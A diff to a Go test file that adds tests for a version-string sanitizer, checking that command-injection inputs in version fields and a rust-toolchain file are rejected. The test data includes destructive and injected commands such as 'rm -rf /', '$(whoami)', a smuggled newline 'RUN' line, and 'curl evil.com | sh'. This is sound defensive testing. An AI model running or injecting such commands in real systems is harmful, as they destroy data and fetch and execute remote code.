@@ -178,6 +178,43 @@ func TestTestDirsList_Empty(t *testing.T) {
 	}
 }
 
+func TestSanitizeVersion(t *testing.T) {
+	tests := []struct {
+		input string
+		want  string
+	}{
+		{"1.25.7", "1.25.7"},
+		{"3.12", "3.12"},
+		{"22", "22"},
+		{"stable", "stable"},
+		{"nightly", "nightly"},
+		{"nightly-2024-01-01", "nightly-2024-01-01"},
+		{"1.80+hotfix", "1.80+hotfix"},
+		// Malicious inputs should be rejected
+		{"3.12; rm -rf /", ""},
+		{"stable$(whoami)", ""},
+		{"22\nRUN evil", ""},
+		{"`id`", ""},
+		{"v1 && curl evil.com | sh", ""},
+		{"", ""},
+	}
+	for _, tt := range tests {
+		got := sanitizeVersion(tt.input)
+		if got != tt.want {
+			t.Errorf("sanitizeVersion(%q) = %q, want %q", tt.input, got, tt.want)
+		}
+	}
+}
+
+func TestDetect_MaliciousVersionFile(t *testing.T) {
+	dir := t.TempDir()
+	writeFile(t, dir, "Cargo.toml", "[package]\nname = \"test\"")
+	writeFile(t, dir, "rust-toolchain", "stable; rm -rf /")
+
+	info := Detect(dir)
+	assertEqual(t, "LanguageVersion", info.LanguageVersion, "")
+}
+
 // helpers
 
 func writeFile(t *testing.T, dir, name, content string) {
